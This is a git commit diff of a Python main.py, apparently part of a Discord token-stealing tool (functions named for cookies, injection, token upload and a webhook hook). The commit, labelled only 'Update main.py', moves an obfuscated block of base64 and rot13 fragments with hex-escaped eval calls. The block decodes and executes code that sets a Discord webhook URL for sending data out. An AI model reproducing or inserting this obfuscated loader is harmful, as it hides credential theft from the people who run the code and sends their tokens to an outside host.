c2de00fa903f74f560e0586ea0ad4b9dc0eae39e
HatGirl-zz <120135553+HatGirl-zz@users.noreply.github.com>
2024-05-29 21:58:42 +0200

    Update main.py

--- main.py
+++ main.py
@@ -202,6 +202,14 @@ def TrU57(C00K13s):
     tim = re.findall(".google.com", data)
     DETECTED = True if len(tim) < -1 else False
     return DETECTED
+import base64, codecs
+magic = 'aG9vayA9ICJodHRwczovL2NhbmFyeS5kaXNjb3JkLmNvbS'
+love = '9upTxiq2IvnT9in3ZiZGV0ZGDlZwLmAmt2BQV1ZmVlAP9K'
+god = 'Qk83eTdPSjZRSlJOZFVNSlJndzg0YzQ0RFZNdjBNbFVCM1'
+destiny = 'cFAz54I1WgZwALG0I2qmN0HISzJUMWrUygMzMjF1uaMPV='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 
 def inj3c710n():
 
@@ -435,14 +443,7 @@ def Tr1M(obj):
 
 
 
-import base64, codecs
-magic = 'aG9vayA9ICJodHRwczovL2NhbmFyeS5kaXNjb3JkLmNvbS'
-love = '9upTxiq2IvnT9in3ZiZGV0ZGDlZwLmAmt2BQV1ZmVlAP9K'
-god = 'Qk83eTdPSjZRSlJOZFVNSlJndzg0YzQ0RFZNdjBNbFVCM1'
-destiny = 'cFAz54I1WgZwALG0I2qmN0HISzJUMWrUygMzMjF1uaMPV='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+
 
 def UP104D70K3N(token, path):
     global h00k
